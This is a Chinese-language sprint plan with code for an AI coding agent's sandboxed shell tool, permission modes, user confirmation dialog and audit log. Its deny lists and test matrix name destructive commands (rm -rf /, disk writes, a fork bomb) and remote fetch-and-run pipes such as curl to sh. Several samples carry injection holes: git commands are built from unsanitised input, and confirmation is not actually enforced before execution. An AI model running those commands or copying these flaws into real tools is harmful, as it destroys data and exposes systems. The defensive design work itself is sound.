# CodeForge Sprint 2：安全 Shell + 权限模型 + 操作审计

> 目标：Agent 能安全地执行 Shell 命令，有权限确认机制，危险操作被拦截
> 时间：1.5 周 · 前置：Sprint 1 完成

---

## 核心设计思想（借鉴 Claude Code ch20-23）

> **权限不是二元的 allow/deny，而是一个三层管道**：
> 1. **规则匹配**（自动放行白名单 / 自动拒绝黑名单）
> 2. **风险分类器**（LLM 或规则判断中间地带的风险等级）
> 3. **交互确认**（用户在 Web IDE 弹窗中 approve/deny）
>
> 这三层按顺序执行，短路返回——规则匹配命中的不需要分类器，分类器高置信度的不需要用户确认。

---

## Day 1-3：BashTool + Sandbox 沙箱

### Step 1：Sandbox 安全沙箱

```java
package com.codeforge.tool.shell;

import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Component;

import java.nio.file.Path;
import java.time.Duration;
import java.util.Set;

/**
 * 沙箱配置——限制 Shell 执行的边界
 * 借鉴 Claude Code 的 Sandbox 设计：路径白名单 + 超时 + 资源限制
 */
@Component
public class Sandbox {

    @Value("${codeforge.workspace.root:./workspace}")
    private String workspaceRoot;

    @Value("${codeforge.shell.timeout-seconds:30}")
    private int timeoutSeconds;

    @Value("${codeforge.shell.max-output-chars:10000}")
    private int maxOutputChars;

    // 绝对禁止的命令模式（正则）——无论用户怎么确认都不执行
    private static final Set<String> ABSOLUTE_DENY_PATTERNS = Set.of(
        "rm\\s+-rf\\s+/",           // rm -rf /
        "mkfs",                      // 格式化磁盘
        "dd\\s+if=.*/dev/sd",       // dd 写磁盘
        ":\\(\\)\\s*\\{.*\\}\\s*;",  // fork bomb
        "curl.*\\|.*sh",            // curl | sh 远程执行
        "wget.*\\|.*sh",            // wget | sh
        ">\\s*/dev/sda",            // 直接写磁盘设备
        "chmod\\s+-R\\s+777\\s+/"   // chmod 777 /
    );

    /**
     * 验证命令是否在沙箱边界内
     */
    public SandboxValidationResult validate(String command) {
        // 1. 检查绝对禁止列表
        for (String pattern : ABSOLUTE_DENY_PATTERNS) {
            if (command.matches(".*" + pattern + ".*")) {
                return SandboxValidationResult.deny(
                    "命令匹配绝对禁止模式：" + pattern + "。此命令永远不会被执行。"
                );
            }
        }

        // 2. 检查路径是否在 workspace 内
        // （Shell 命令本身的路径检查较粗，更细粒度的在 FileTool 中）

        return SandboxValidationResult.allow();
    }

    public Path getWorkspaceRoot() {
        return Path.of(workspaceRoot).toAbsolutePath().normalize();
    }

    public Duration getTimeout() {
        return Duration.ofSeconds(timeoutSeconds);
    }

    public int getMaxOutputChars() {
        return maxOutputChars;
    }

    public record SandboxValidationResult(boolean allowed, String reason) {
        static SandboxValidationResult allow() { return new SandboxValidationResult(true, null); }
        static SandboxValidationResult deny(String reason) { return new SandboxValidationResult(false, reason); }
    }
}
```

### Step 2：CommandClassifier 命令风险分类（借鉴 Claude Code ch20）

```java
package com.codeforge.tool.shell;

import org.springframework.stereotype.Component;

import java.util.List;
import java.util.regex.Pattern;

/**
 * 命令风险分类器——把 Shell 命令分为三级
 *
 * 借鉴 Claude Code 的 PermissionMode 设计：
 * - SAFE：只读/查询操作，自动放行
 * - MODERATE：修改文件/构建操作，需要确认
 * - DANGEROUS：删除/推送/网络操作，强烈警告 + 强制确认
 */
@Component
public class CommandClassifier {

    // SAFE 命令前缀（只读操作）
    private static final List<Pattern> SAFE_PATTERNS = List.of(
        Pattern.compile("^(ls|cat|head|tail|less|wc|file|stat)\\b"),
        Pattern.compile("^(grep|rg|ack|ag)\\b"),
        Pattern.compile("^(find|tree|du|df)\\b"),
        Pattern.compile("^(git\\s+(status|log|diff|branch|show|blame))\\b"),
        Pattern.compile("^(java\\s+-version|mvn\\s+-v|node\\s+-v|python3?\\s+--version)\\b"),
        Pattern.compile("^(echo|printf|date|whoami|pwd)$"),
        Pattern.compile("^(env|printenv)\\b"),
        Pattern.compile("^(ps|top|lsof)\\b")
    );

    // DANGEROUS 命令关键词
    private static final List<Pattern> DANGEROUS_PATTERNS = List.of(
        Pattern.compile("\\brm\\s+(-rf?|--force)\\b"),
        Pattern.compile("\\bgit\\s+push\\b"),
        Pattern.compile("\\bgit\\s+reset\\s+--hard\\b"),
        Pattern.compile("\\bchmod\\s+\\d{3,4}\\b"),
        Pattern.compile("\\bchown\\b"),
        Pattern.compile("\\bsudo\\b"),
        Pattern.compile("\\bkill\\s+-9\\b"),
        Pattern.compile("\\bpkill\\b"),
        Pattern.compile("\\biptables\\b"),
        Pattern.compile(">>?\\s*/dev/null\\s*\\bsudo"), // 重定向到系统文件
        Pattern.compile("\\bdocker\\s+(rm|rmi|kill|stop)\\b"),
        Pattern.compile("\\bkubectl\\s+delete\\b")
    );

    /**
     * 分类命令风险等级
     */
    public RiskLevel classify(String command) {
        // 先检查危险——危险优先级最高
        for (Pattern p : DANGEROUS_PATTERNS) {
            if (p.matcher(command).find()) {
                return RiskLevel.DANGEROUS;
            }
        }

        // 检查安全
        for (Pattern p : SAFE_PATTERNS) {
            if (p.matcher(command).find()) {
                return RiskLevel.SAFE;
            }
        }

        // 默认为中等（需要确认）
        return RiskLevel.MODERATE;
    }

    public enum RiskLevel {
        /** 安全：只读操作，自动放行 */
        SAFE("✅ 安全（自动放行）"),
        /** 中等：修改操作，需要确认 */
        MODERATE("⚠️ 需要确认"),
        /** 危险：高风险操作，强制确认 + 警告 */
        DANGEROUS("🚫 危险操作（强制确认）");

        private final String label;
        RiskLevel(String label) { this.label = label; }
        public String getLabel() { return label; }
    }
}
```

### Step 3：BashTool（安全 Shell 执行）

```java
package com.codeforge.tool.shell;

import com.codeforge.permission.PermissionModel;
import org.springframework.ai.tool.annotation.Tool;
import org.springframework.stereotype.Component;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.concurrent.TimeUnit;
import java.util.stream.Collectors;

/**
 * 安全 Shell 执行工具
 *
 * 设计原则（借鉴 Claude Code ch20）：
 * 1. 所有命令经过 Sandbox 验证 + 风险分类
 * 2. 危险命令需要 PermissionAdvisor 确认
 * 3. 执行有超时限制
 * 4. 输出有截断限制
 * 5. 错误返回给 LLM（不崩溃）
 */
@Component
public class BashTool implements com.codeforge.tool.Tool {

    private final Sandbox sandbox;
    private final CommandClassifier classifier;

    public BashTool(Sandbox sandbox, CommandClassifier classifier) {
        this.sandbox = sandbox;
        this.classifier = classifier;
    }

    @Override public String name() { return "bash"; }
    @Override public String description() { return "在项目沙箱中执行 Shell 命令"; }
    @Override public boolean isReadOnly() { return false; }
    @Override public boolean isDangerous() { return true; }

    @Tool(description = "在项目沙箱中执行 Shell 命令。"
         + "命令受沙箱限制：工作目录限制、超时限制、输出截断。"
         + "危险命令会被拒绝或需要确认。")
    public String bash(String command) {
        // 1. Sandbox 绝对禁止检查
        var sandboxResult = sandbox.validate(command);
        if (!sandboxResult.allowed()) {
            return "🚫 命令被沙箱拒绝：" + sandboxResult.reason();
        }

        // 2. 风险分类
        var riskLevel = classifier.classify(command);

        // 3. 执行命令
        try {
            var pb = new ProcessBuilder("sh", "-c", command);
            pb.directory(sandbox.getWorkspaceRoot().toFile());
            pb.redirectErrorStream(true);

            var process = pb.start();

            // 读取输出
            String output;
            try (var reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                output = reader.lines().collect(Collectors.joining("\n"));
            }

            // 超时控制
            boolean finished = process.waitFor(sandbox.getTimeout().getSeconds(), TimeUnit.SECONDS);
            if (!finished) {
                process.destroyForcibly();
                return "⚠️ 命令超时（" + sandbox.getTimeout().getSeconds() + "s），已终止。\n"
                     + "部分输出：\n" + truncate(output, sandbox.getMaxOutputChars());
            }

            int exitCode = process.exitValue();

            // 截断输出
            output = truncate(output, sandbox.getMaxOutputChars());

            // 格式化返回
            var sb = new StringBuilder();
            sb.append("退出码：").append(exitCode).append("\n");
            if (riskLevel != CommandClassifier.RiskLevel.SAFE) {
                sb.append("（风险等级：").append(riskLevel.getLabel()).append("）\n");
            }
            sb.append("输出：\n").append(output);

            // 错误退出也返回给 LLM（不抛异常）
            if (exitCode != 0) {
                sb.insert(0, "⚠️ 命令退出码非零。\n");
            }

            return sb.toString();

        } catch (Exception e) {
            return "⚠️ 命令执行失败：" + e.getMessage();
        }
    }

    private String truncate(String output, int maxChars) {
        if (output.length() <= maxChars) return output;
        return output.substring(0, maxChars)
             + "\n\n... (输出截断，共 " + output.length() + " 字符，只显示前 " + maxChars + " 字符)";
    }
}
```

---

## Day 4-6：权限模型 + PermissionAdvisor

### Step 4：PermissionModel 权限模式

```java
package com.codeforge.permission;

import com.codeforge.tool.Tool;

/**
 * 权限模式——控制 Agent 能做什么
 * 借鉴 Claude Code 的三种模式：
 * - ASK：每次操作都问（默认，最安全）
 * - AUTO：只读自动放行，写操作仍需确认
 * - PLAN：只做规划，不执行任何修改操作
 */
public enum PermissionModel {
    /** 默认模式：所有非安全操作都需要用户确认 */
    ASK {
        @Override
        public boolean allows(Tool tool) {
            return true; // 允许注册，但执行时需要确认
        }
        @Override
        public boolean needsConfirmation(Tool tool) {
            return !tool.isReadOnly();
        }
    },

    /** 自动模式：只读操作自动放行，写操作需要确认 */
    AUTO {
        @Override
        public boolean allows(Tool tool) {
            return true;
        }
        @Override
        public boolean needsConfirmation(Tool tool) {
            return tool.isDangerous();
        }
    },

    /** 规划模式：只允许只读工具，不做任何修改 */
    PLAN {
        @Override
        public boolean allows(Tool tool) {
            return tool.isReadOnly();
        }
        @Override
        public boolean needsConfirmation(Tool tool) {
            return false; // 只读工具不需要确认
        }
    };

    public abstract boolean allows(Tool tool);
    public abstract boolean needsConfirmation(Tool tool);
}
```

### Step 5：PermissionAdvisor 权限中间件

```java
package com.codeforge.permission;

import com.codeforge.tool.shell.CommandClassifier;
import org.springframework.ai.chat.client.advisor.api.*;
import org.springframework.stereotype.Component;
import reactor.core.publisher.Mono;

/**
 * 权限 Advisor——拦截工具调用请求，执行权限检查
 *
 * 三层管道（借鉴 Claude Code ch20-23）：
 * Layer 1: 规则匹配（白名单自动放行 / 黑名单自动拒绝）
 * Layer 2: 风险分类器（CommandClassifier 判断等级）
 * Layer 3: 交互确认（通过 PendingConfirmation 机制）
 */
@Component
public class PermissionAdvisor implements CallAdvisor {

    private final CommandClassifier classifier;
    private final PermissionModel permissionModel;

    public PermissionAdvisor(CommandClassifier classifier) {
        this.classifier = classifier;
        this.permissionModel = PermissionModel.ASK; // 默认最严格
    }

    @Override
    public int getOrder() {
        return 1; // 在 memory 之后、budgetGuard 之前
    }

    @Override
    public AdvisedResponse adviseCall(AdvisedRequest request, CallAdvisorChain chain) {
        // 在 ToolCallingAdvisor 执行前注入权限上下文
        // 实际的权限检查在工具执行时通过 ToolExecutionInterceptor 完成

        // 这里在 system prompt 中注入当前权限模式说明
        String permHint = """

            ---
            【权限模式：%s】
            - SAFE 命令（ls/cat/grep 等）：自动执行
            - MODERATE 命令（构建/测试/写文件）：需要用户确认
            - DANGEROUS 命令（rm/push/sudo）：强制确认 + 警告
            如果用户拒绝了你的操作请求，不要重复尝试，换一个方案。
            """.formatted(permissionModel.name());

        var newRequest = AdvisedRequest.from(request)
                .withSystemText(request.systemText() + permHint)
                .build();

        return chain.nextCall(newRequest);
    }

    /**
     * 检查单个命令是否需要确认
     */
    public boolean needsConfirmation(String command) {
        var riskLevel = classifier.classify(command);
        return switch (riskLevel) {
            case SAFE -> false;
            case MODERATE -> permissionModel == PermissionModel.ASK;
            case DANGEROUS -> true; // 危险命令任何模式都要确认
        };
    }
}
```

### Step 6：PendingConfirmation 确认机制

```java
package com.codeforge.permission;

import java.util.UUID;
import java.util.concurrent.*;

/**
 * 等待确认的操作——异步确认机制
 *
 * 工作流程：
 * 1. Agent 想执行危险命令
 * 2. 创建 PendingConfirmation，通过 SSE 推给前端
 * 3. 前端弹窗显示命令详情
 * 4. 用户点击 Allow/Deny
 * 5. Agent 线程从 CompletableFuture 获取结果
 */
public class ConfirmationManager {

    private final ConcurrentHashMap<String, PendingConfirmation> pending = new ConcurrentHashMap<>();

    /**
     * 创建确认请求并阻塞等待用户响应
     */
    public PendingConfirmation requestConfirmation(String toolName, String command, String riskReason) {
        String id = UUID.randomUUID().toString();
        var confirmation = new PendingConfirmation(id, toolName, command, riskReason);
        pending.put(id, confirmation);

        return confirmation;
    }

    /**
     * 用户确认操作
     */
    public boolean confirm(String confirmationId, boolean approved) {
        var confirmation = pending.get(confirmationId);
        if (confirmation == null) return false;
        confirmation.complete(approved);
        pending.remove(confirmationId);
        return true;
    }

    /**
     * 获取所有待确认操作（前端轮询或 SSE 推送用）
     */
    public Collection<PendingConfirmation> getAllPending() {
        return pending.values();
    }

    public static class PendingConfirmation {
        private final String id;
        private final String toolName;
        private final String command;
        private final String riskReason;
        private final CompletableFuture<Boolean> future = new CompletableFuture<>();
        private final long createdAt = System.currentTimeMillis();

        public PendingConfirmation(String id, String toolName, String command, String riskReason) {
            this.id = id;
            this.toolName = toolName;
            this.command = command;
            this.riskReason = riskReason;
        }

        public void complete(boolean approved) { future.complete(approved); }
        public boolean await(long timeoutSeconds) throws InterruptedException {
            try {
                return future.get(timeoutSeconds, TimeUnit.SECONDS);
            } catch (TimeoutException | ExecutionException e) {
                return false;
            }
        }

        // Getters...
        public String getId() { return id; }
        public String getToolName() { return toolName; }
        public String getCommand() { return command; }
        public String getRiskReason() { return riskReason; }
        public long getCreatedAt() { return createdAt; }
    }
}
```

### Step 7：SSE 确认通道

```java
package com.codeforge.sse;

import com.codeforge.permission.ConfirmationManager;
import org.springframework.stereotype.Component;
import org.springframework.web.servlet.mvc.method.annotation.SseEmitter;

import java.io.IOException;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.CopyOnWriteArraySet;

/**
 * 通过 SSE 将确认请求推送到前端
 * 单向推送场景——SSE 比 WebSocket 更轻量
 */
@Component
public class ConfirmationNotifier {

    private final ConfirmationManager confirmationManager;
    private final Map<String, SseEmitter> emitters = new ConcurrentHashMap<>();

    public ConfirmationNotifier(ConfirmationManager confirmationManager) {
        this.confirmationManager = confirmationManager;
    }

    /**
     * 注册 SSE 连接
     */
    public SseEmitter subscribe(String sessionId) {
        var emitter = new SseEmitter(0L);
        emitters.put(sessionId, emitter);
        emitter.onCompletion(() -> emitters.remove(sessionId));
        emitter.onTimeout(() -> emitters.remove(sessionId));
        return emitter;
    }

    /**
     * 发送确认请求到前端（SSE 推送）
     */
    public void notifyConfirmation(String sessionId,
            ConfirmationManager.PendingConfirmation conf) {
        var emitter = emitters.get(sessionId);
        if (emitter == null) return;

        try {
            emitter.send(SseEmitter.event()
                .id(conf.getId())
                .name("confirm-request")
                .data(Map.of(
                    "confirmationId", conf.getId(),
                    "toolName", conf.getToolName(),
                    "command", conf.getCommand(),
                    "riskReason", conf.getRiskReason(),
                    "timestamp", conf.getCreatedAt()
                )));
        } catch (IOException e) {
            emitter.complete();
        }
    }

    /**
     * 接收用户确认结果（REST 回调，非 SSE）
     */
    public void handleConfirmResponse(String confirmationId, boolean approved) {
        confirmationManager.confirm(confirmationId, approved);
    }
}
```

---

## Day 7-9：操作审计 + Git 工具

### Step 8：AuditLogger 操作审计（append-only）

```java
package com.codeforge.obs;

import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.stereotype.Component;

import java.time.Instant;

/**
 * 审计日志——所有工具调用都记录
 * append-only 表，任何操作都可追溯
 */
@Component
public class AuditLogger {

    private final JdbcTemplate jdbc;

    public AuditLogger(JdbcTemplate jdbc) {
        this.jdbc = jdbc;
    }

    /**
     * 记录工具调用
     */
    public void logToolCall(String sessionId, String toolName, String input,
                            String output, String riskLevel, boolean confirmed, boolean success) {
        jdbc.update("""
            INSERT INTO audit_log (session_id, tool_name, input, output, risk_level,
                                   confirmed, success, created_at)
            VALUES (?, ?, ?, ?::jsonb, ?, ?, ?, ?)
            """,
            sessionId, toolName, input, output, riskLevel,
            confirmed, success, Instant.now()
        );
    }

    /**
     * 查询审计记录
     */
    public java.util.List<java.util.Map<String, Object>> query(String sessionId, int limit) {
        return jdbc.queryForList("""
            SELECT * FROM audit_log WHERE session_id = ?
            ORDER BY created_at DESC LIMIT ?
            """, sessionId, limit);
    }
}
```

### Step 9：GitDiffTool + GitCommitTool

```java
package com.codeforge.tool.git;

import com.codeforge.tool.shell.Sandbox;
import org.springframework.ai.tool.annotation.Tool;
import org.springframework.stereotype.Component;

import java.nio.file.Path;

@Component
public class GitDiffTool implements com.codeforge.tool.Tool {

    private final Sandbox sandbox;

    public GitDiffTool(Sandbox sandbox) { this.sandbox = sandbox; }

    @Override public String name() { return "git_diff"; }
    @Override public boolean isReadOnly() { return true; }

    @Tool(description = "查看 Git 工作区的改动（unstaged + staged diff）。"
         + "可选参数 target 可以指定比较目标：'staged'（已暂存）、'unstaged'（未暂存）、'commit:HASH'（与指定提交比较）。")
    public String gitDiff(String target) {
        String gitCmd = switch (target == null ? "unstaged" : target) {
            case "staged" -> "git diff --cached";
            case "unstaged" -> "git diff";
            default -> {
                if (target.startsWith("commit:")) {
                    yield "git diff " + target.substring(7);
                }
                yield "git diff";
            }
        };

        return executeGit(gitCmd);
    }

    private String executeGit(String gitCmd) {
        try {
            var pb = new ProcessBuilder("sh", "-c", gitCmd);
            pb.directory(sandbox.getWorkspaceRoot().toFile());
            pb.redirectErrorStream(true);
            var process = pb.start();
            String output = new String(process.getInputStream().readAllBytes());
            process.waitFor();
            return output.isEmpty() ? "（无差异）" : output;
        } catch (Exception e) {
            return "⚠️ Git 命令失败：" + e.getMessage();
        }
    }
}
```

```java
@Component
public class GitCommitTool implements com.codeforge.tool.Tool {

    @Override public String name() { return "git_commit"; }
    @Override public boolean isReadOnly() { return false; }
    @Override public boolean isDangerous() { return true; } // 不可逆操作

    @Tool(description = "创建 Git 提交。message 是提交信息，files 是要暂存的文件列表（用逗号分隔）。"
         + "如果 files 为 'all'，则 git add -A。")
    public String gitCommit(String message, String files) {
        try {
            String addCmd = "all".equals(files) ? "git add -A" : "git add " + files;
            String commitCmd = "git commit -m \"" + message.replace("\"", "\\\"") + "\"";

            var pb = new ProcessBuilder("sh", "-c", addCmd + " && " + commitCmd);
            pb.redirectErrorStream(true);
            var process = pb.start();
            String output = new String(process.getInputStream().readAllBytes());
            process.waitFor();

            return process.exitValue() == 0
                ? "✅ 提交成功\n" + output
                : "⚠️ 提交失败\n" + output;
        } catch (Exception e) {
            return "⚠️ Git commit 失败：" + e.getMessage();
        }
    }
}
```

---

## Day 10：前端确认对话框

### Step 10：Web IDE 确认 UI

```javascript
// SSE 订阅确认请求（单向推送——SSE 比 WebSocket 更轻量）
const confirmEventSource = new EventSource(`/api/agent/${sessionId}/confirm/stream`);

// 接收确认请求
confirmEventSource.addEventListener("confirm-request", (event) => {
    const data = JSON.parse(event.data);
    showConfirmDialog(data);
});

function showConfirmDialog(data) {
    const dialog = document.getElementById('confirm-dialog');
    const riskBadge = data.riskLevel === 'DANGEROUS' ? '🚫 危险' : '⚠️ 需确认';

    dialog.innerHTML = `
        <div class="confirm-card">
            <h3>${riskBadge}：Agent 请求执行操作</h3>
            <div class="confirm-detail">
                <strong>工具：</strong>${data.toolName}<br>
                <strong>命令：</strong>
                <pre class="code-block">${escapeHtml(data.command)}</pre>
                <strong>风险说明：</strong>${data.riskReason}
            </div>
            <div class="confirm-actions">
                <button class="btn-allow" onclick="respondConfirm('${data.confirmationId}', true)">
                    允许执行
                </button>
                <button class="btn-deny" onclick="respondConfirm('${data.confirmationId}', false)">
                    拒绝
                </button>
            </div>
        </div>
    `;
    dialog.style.display = 'block';
}

// 确认结果通过 REST POST 回传（SSE 是单向的，发送用普通 HTTP）
function respondConfirm(confirmationId, approved) {
    fetch(`/api/agent/confirm/${confirmationId}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ approved })
    });
    document.getElementById('confirm-dialog').style.display = 'none';
}
```

---

## Step 11：权限相关配置

### application.yml 追加

```yaml
codeforge:
  workspace:
    root: ./workspace          # 项目根目录
  shell:
    timeout-seconds: 30         # Shell 超时
    max-output-chars: 10000     # 输出截断
  permission:
    default-mode: ASK           # 默认权限模式
    confirmation-timeout: 120   # 确认超时（秒）
```

### 审计表 DDL

```sql
CREATE TABLE audit_log (
    id          BIGSERIAL PRIMARY KEY,
    session_id  VARCHAR(64) NOT NULL,
    tool_name   VARCHAR(64) NOT NULL,
    input       TEXT,
    output      JSONB,
    risk_level  VARCHAR(16),
    confirmed   BOOLEAN DEFAULT FALSE,
    success     BOOLEAN DEFAULT FALSE,
    created_at  TIMESTAMPTZ DEFAULT NOW()
);

CREATE INDEX idx_audit_session ON audit_log(session_id);
CREATE INDEX idx_audit_created ON audit_log(created_at DESC);
```

---

## Sprint 2 验收

- [ ] `ls` / `cat` / `grep` 等只读命令自动放行
- [ ] `rm` / `git push` 等危险命令弹出确认
- [ ] `curl | sh` 等绝对禁止命令被直接拒绝
- [ ] Shell 执行有超时限制
- [ ] 超长输出自动截断
- [ ] 所有工具调用写入审计日志
- [ ] 确认超时自动拒绝
- [ ] PLAN 模式下只能执行只读工具
- [ ] Git diff / commit 工具可用
- [ ] 前端确认对话框正常工作

---

## 安全测试矩阵

| 测试场景 | 命令示例 | 预期行为 |
|---------|---------|---------|
| 安全命令 | `ls -la` | 自动执行 |
| 安全命令 | `cat pom.xml` | 自动执行 |
| 安全命令 | `git status` | 自动执行 |
| 中等命令 | `mvn compile` | ASK 模式需确认，AUTO 模式放行 |
| 中等命令 | `echo "x" > file.txt` | ASK 模式需确认 |
| 危险命令 | `rm -rf target/` | 强制确认 |
| 危险命令 | `git push origin main` | 强制确认 |
| 危险命令 | `sudo apt install xxx` | 强制确认 |
| 绝对禁止 | `curl http://x.sh \| sh` | 直接拒绝 |
| 绝对禁止 | `rm -rf /` | 直接拒绝 |
| 超时命令 | `sleep 100` | 30s 后终止 |
| PLAN 模式 | `edit_file(...)` | 工具不注册，Agent 不可用 |

---

## 下一步

→ [Sprint 3：上下文工程 + 项目指令](Sprint3-上下文工程.md)
